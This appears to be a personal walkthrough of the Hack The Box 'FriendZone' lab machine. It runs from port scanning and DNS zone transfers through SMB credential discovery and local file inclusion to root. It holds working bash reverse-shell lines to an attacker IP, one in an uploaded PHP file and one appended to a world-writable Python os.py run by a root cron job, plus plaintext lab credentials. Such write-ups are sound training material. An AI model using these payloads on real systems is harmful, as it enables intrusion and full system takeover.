#linux 

# Story
1. Port scan, https has friendzone.red domain
2. Check http website, friendzoneportal.red seems interesting
3. Check https as well, there are some information about js in source code
4. Check smb, some are readable and writable meaning that we can upload?
5. Find some creds in smb
6. dig more domains
7. Check login websites
8. LFI is available
9. Get shell through LFI (user flag)
10. www-data to friend through sql conf file
11. check cron jobs using pspy
12. check the python code and it uses certain libraries
13. check the permission for libraries and add some lines
14. open nc and wait for cron job to run python file
15. get the flag (root flag)

# Enumeration
## Nmap port scan

```
nmap -sC -sV friendzone.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-24 21:59 EST
Nmap scan report for friendzone.htb (10.129.88.74)
Host is up (0.092s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a96824bc971f1e54a58045e74cd9aaa0 (RSA)
|   256 e5440146ee7abb7ce91acb14999e2b8e (ECDSA)
|_  256 004e1a4f33e8a0de86a6e42a5f84612b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-title: 404 Not Found
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -40m02s, deviation: 1h09m16s, median: -3s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-25T02:59:46
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2023-02-25T04:59:46+02:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.46 seconds
                                                               
```

port 443 friendzone.red somewhat interesting lets add it to etc/hosts

## Gobuster http
```
gobuster dir -u http://friendzone.htb/ --wordlist /usr/share/wordlis
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://friendzone.htb/
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-li
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/02/24 22:02:14 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 320] [--> http://friendzone.htb/wordpress/]                                                          
Progress: 141570 / 141709 (99.90%)
===============================================================
2023/02/24 22:03:47 Finished
===============================================================
                                    
```


## Gobuster https

```
gobuster dir -u https://friendzone.red/ --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt -k -t 150
```
with -k option we can skip certification 
we would get something like this if we dont skip it.
```
Error: error on running gobuster: unable to connect to https://friendzone.red/: invalid certificate: x509: certificate has expired or is not yet valid: current time 2023-02-25T07:46:50-05:00 is after 2018-11-04T21:02:30Z
```

```
/admin                (Status: 301) [Size: 318] [--> https://friendzone.red/admin/]
/js                   (Status: 301) [Size: 315] [--> https://friendzone.red/js/]
```

## FTP port 21
Anonymous login not allowed


## Http port 80

### friendzone.htb/
![[Pasted image 20230225123517.png]]
friendzoneportal.red???

### /wordpress
![[Pasted image 20230225120516.png]]

## Https port 443
![[Pasted image 20230225165344.png]]

In the source code
![[Pasted image 20230225165434.png]]
### /js/js
![[Pasted image 20230225165633.png]]
```
WElMa3JQdG5vYTE2NzczMTE3NzUxNW9IR0ZlUkpp
```

### /admin
![[Pasted image 20230225215624.png]]


## Samba port 445

### smbmap
```
smbmap -H friendzone.htb   
[+] Guest session       IP: friendzone.htb:445  Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                                                 READ ONLY       FriendZone Samba Server Files
        Development                                             READ, WRITE     FriendZone Samba Server Files
        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
                                                              
```

readonly
general
Read and write
Development

### smbclient
```
smbclient -N -L //friendzone.htb

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        HTB                  LEGACY
        WORKGROUP            FRIENDZONE
                                              
```

#### Development
```
smbclient -N //friendzone.htb/Development
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Feb 24 22:11:07 2023
  ..                                  D        0  Tue Sep 13 10:56:24 2022

                3545824 blocks of size 1024. 1622184 blocks available
```
nothing

#### general
```
smbclient -N //friendzone.htb/general    
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 15:10:51 2019
  ..                                  D        0  Tue Sep 13 10:56:24 2022
  creds.txt                           N       57  Tue Oct  9 19:52:42 2018

                3545824 blocks of size 1024. 1622184 blocks available
```

Creds.txt
```
cat creds.txt       
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

## Check domain
### friendzone.htb
```
dig axfr friendzone.htb @10.129.209.64

; <<>> DiG 9.18.11-2-Debian <<>> axfr friendzone.htb @10.129.209.64
;; global options: +cmd
; Transfer failed.
```

### friendzone.red
```
dig axfr friendzone.red @10.129.88.74

; <<>> DiG 9.18.11-2-Debian <<>> axfr friendzone.red @10.129.88.74
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 88 msec
;; SERVER: 10.129.88.74#53(10.129.88.74) (TCP)
;; WHEN: Fri Feb 24 22:36:08 EST 2023
;; XFR size: 8 records (messages 1, bytes 289)
```

`administrator1.friendzone.red, hr.friendzone.red, uploads.friendzone.red`

### administrator1.friendzone.red
```
dig axfr administrator1.friendzone.red @10.129.209.64

; <<>> DiG 9.18.11-2-Debian <<>> axfr administrator1.friendzone.red @10.129.209.64
;; global options: +cmd
; Transfer failed.
```

### hr.friendzone.red
```
dig axfr hr.friendzone.red @10.129.209.64

; <<>> DiG 9.18.11-2-Debian <<>> axfr hr.friendzone.red @10.129.209.64
;; global options: +cmd
; Transfer failed.
```

### uploads.friendzone.red
```
dig axfr uploads.friendzone.red @10.129.209.64

; <<>> DiG 9.18.11-2-Debian <<>> axfr uploads.friendzone.red @10.129.209.64
;; global options: +cmd
; Transfer failed.
```

### friendzoneportal.red

```
dig axfr friendzoneportal.red @10.129.209.64

; <<>> DiG 9.18.11-2-Debian <<>> axfr friendzoneportal.red @10.129.209.64
;; global options: +cmd
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.   604800  IN      AAAA    ::1
friendzoneportal.red.   604800  IN      NS      localhost.
friendzoneportal.red.   604800  IN      A       127.0.0.1
admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
files.friendzoneportal.red. 604800 IN   A       127.0.0.1
imports.friendzoneportal.red. 604800 IN A       127.0.0.1
vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 188 msec
;; SERVER: 10.129.209.64#53(10.129.209.64) (TCP)
;; WHEN: Sat Feb 25 07:20:44 EST 2023
;; XFR size: 9 records (messages 1, bytes 309)
```

## /etc/hosts

```
10.129.209.64 friendzone.htb friendzone.red friendzoneportal.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red
```

## Check other subdomains

### friendzoneportal.red
![[Pasted image 20230225211811.png]]

### administrator1.friendzone.red
![[Pasted image 20230225211731.png]]

#### try to login
admin:WORKWORKHhallelujah@#
![[Pasted image 20230225215810.png]]

### dashboard.php
![[Pasted image 20230225222346.png]]

#### Default image
```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp
```

![[Pasted image 20230225222541.png]]
Final Access timestamp is 1677335106

#### gobuster

```
gobuster dir -u https://administrator1.friendzone.red/ --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt -k -t 150
/images         
```

try php as well
```
gobuster dir -u https://administrator1.friendzone.red/ --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt -k -x php -t 150

/.php                 (Status: 403) [Size: 309]
/images               (Status: 301) [Size: 349] [--> https://administrator1.friendzone.red/images/]
/dashboard.php        (Status: 200) [Size: 101]
/login.php            (Status: 200) [Size: 7]
/timestamp.php        (Status: 200) [Size: 36]
```
### hr.friendzone.red
![[Pasted image 20230225213527.png]]

### uploads.friendzone.red
![[Pasted image 20230225213648.png]]

### admin.friendzoneportal.red 
![[Pasted image 20230225214100.png]]

#### try to login
admin:WORKWORKHhallelujah@#
![[Pasted image 20230225214341.png]]
### files.friendzoneportal.red 
404
### imports.friendzoneportal.red 
404
### vpn.friendzoneportal.red
404


# Foothold
## playing with parameters

```
view-source:https://administrator1.friendzone.red/dashboard.php?image_id=d.jpg
<img src='images/d.jpg'>
```

## trying xss
This works
```
a.jpg'><script>alert('xss')</script>
```

```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg%27%3E%3Cscript%3Ealert(%27xss%27)%3C/script%3E
```

![[Pasted image 20230225230504.png]]

## second parameter

Visit
`//administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp`

![[Pasted image 20230225230947.png]]

Is the bottom side showing the php folder?
![[Pasted image 20230225231022.png]]
#### /dashboard.php?image_id=a.jpg&pagename=login
![[Pasted image 20230225231100.png]]
maybe we can move around in directory?

### look for other php files

uploads.friendzone.red/upload.php
![[Pasted image 20230225231506.png]]
```
curl https://uploads.friendzone.red/upload.php -k  
WHAT ARE YOU TRYING TO DO HOOOOOOMAN ! 
```

admin.friendzoneportal.red/login.php

![[Pasted image 20230225231606.png]]

curl https://admin.friendzone.red/login.php -k
Redirecting                                                                                                                                                  

### gobuster again
```
gobuster dir -u https://uploads.friendzone.red/ --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt -k -t 150

```


## Uploading files

![[Pasted image 20230226002303.png]]
Files share is under /etc/Files, so probably /etc/Development/files if we upload something

```test.php                                             
<?php echo 'test'; ?>
```
Upload this file

```
smbclient -N //friendzone.htb/Development   
Try "help" to get a list of possible commands.
smb: \> put test.php
putting file test.php as \test.php (0.0 kb/s) (average 0.0 kb/s)
smb: \> ls
  .                                   D        0  Sat Feb 25 09:39:48 2023
  ..                                  D        0  Tue Sep 13 10:56:24 2022
  test.php                            A       22  Sat Feb 25 09:39:49 2023

                3545824 blocks of size 1024. 1537504 blocks available
```


Revisit the page
```
https://administrator1.friendzone.red/dashboard.php?image_id=1.jpg&pagename=/etc/Development/test
```

![[Pasted image 20230226002445.png]]

We could display test string

## Reverse shell
put revshell
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

```
smbclient -N //friendzone.htb/Development   
Try "help" to get a list of possible commands.
smb: \> put revshell.php
cli_push returned NT_STATUS_IO_TIMEOUT
```

```revshell.php
cat revshell.php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.26/1234 0>&1'");?>
```

```
https://administrator1.friendzone.red/dashboard.php?image_id=1.jpg&pagename=/etc/Development/revshell
```

```
nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.26] from (UNKNOWN) [10.129.209.64] 52178
bash: cannot set terminal process group (750): Inappropriate ioctl for device
bash: no job control in this shell
www-data@FriendZone:/var/www/admin$ 
```

## Flag
```
www-data@FriendZone:/home/friend$ cat user.txt
cat user.txt
```

# Privilege escalation

## Enumeration

### Upgrade shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

### www-data to friend
mysql_data.conf
```
www-data@FriendZone:/var/www$ cat mysql_data.conf
cat mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```

su friend with the password above.

### sudo -l

```
friend@FriendZone:/var/www$ sudo -l
sudo -l
[sudo] password for friend: Agpyu12!0.213$

Sorry, user friend may not run sudo on FriendZone.
```

or we can ssh to friend

### python
```
friend@FriendZone:/opt/server_admin$ cat reporter.py
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

```
friend@FriendZone:/usr/lib/python2.7$ ls -la |grep os
-rwxr-xr-x  1 root   root     4635 Apr 16  2018 os2emxpath.py
-rwxr-xr-x  1 root   root     4507 Oct  6  2018 os2emxpath.pyc
-rwxrwxrwx  1 root   root    25910 Jan 15  2019 os.py
-rw-rw-r--  1 friend friend  25583 Jan 15  2019 os.pyc
-rwxr-xr-x  1 root   root    19100 Apr 16  2018 _osx_support.py
-rwxr-xr-x  1 root   root    11720 Oct  6  2018 _osx_support.pyc
-rwxr-xr-x  1 root   root     8003 Apr 16  2018 posixfile.py
-rwxr-xr-x  1 root   root     7628 Oct  6  2018 posixfile.pyc
-rwxr-xr-x  1 root   root    13935 Apr 16  2018 posixpath.py
-rwxr-xr-x  1 root   root    11385 Oct  6  2018 posixpath.pyc
```
os.py has permission

### pspy
check cron

```
2023/02/26 05:42:01 CMD: UID=0     PID=9320   | /bin/sh -c /opt/server_admin/reporter.py                                                        
2023/02/26 05:42:01 CMD: UID=0     PID=9319   | /bin/sh -c /opt/server_admin/reporter.py                                                        
2023/02/26 05:42:01 CMD: UID=0     PID=9318   | /usr/sbin/CRON -f 
2023/02/26 05:42:01 CMD: UID=0     PID=9321   | /usr/bin/python /opt/server_admin/reporter.py                                                   
2023/02/26 05:42:01 CMD: UID=0     PID=9322   | /bin/bash -c bash -i >& /dev/tcp/10.10.14.26/1234 0>&1                                          
2023/02/26 05:42:01 CMD: UID=0     PID=9323   | /bin/bash -c bash -i >& /dev/tcp/10.10.14.26/1234 0>&1                                          
```
We can run reporter.py as root, so if we can somehow put bin/bash or revshell in the code then we are goot.

## Perform escalation

append revshell at the end so it becomes something like this.
```os.py
...
try:
    _copy_reg.pickle(statvfs_result, _pickle_statvfs_result,
                     _make_statvfs_result)
except NameError: # statvfs_result may not exist
    pass

import os
os.system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.26/1234 0>&1'")
```

```
nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.26] from (UNKNOWN) [10.129.209.64] 52496
bash: cannot set terminal process group (4972): Inappropriate ioctl for device
bash: no job control in this shell
root@FriendZone:~# 
```